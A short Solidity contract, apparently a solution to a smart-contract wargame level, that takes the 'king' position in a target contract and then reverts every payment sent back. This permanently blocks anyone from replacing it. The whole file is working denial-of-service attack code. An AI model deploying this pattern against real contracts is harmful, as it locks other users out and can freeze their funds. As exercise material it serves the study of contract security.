// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingHack {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function hack() external {
        (bool success, ) = payable(target).call{value: 0.001 ether}("");
        require(success, "failed");
    }

    receive() external payable {
        require(msg.sender != target, "no more king"); 
    }
}
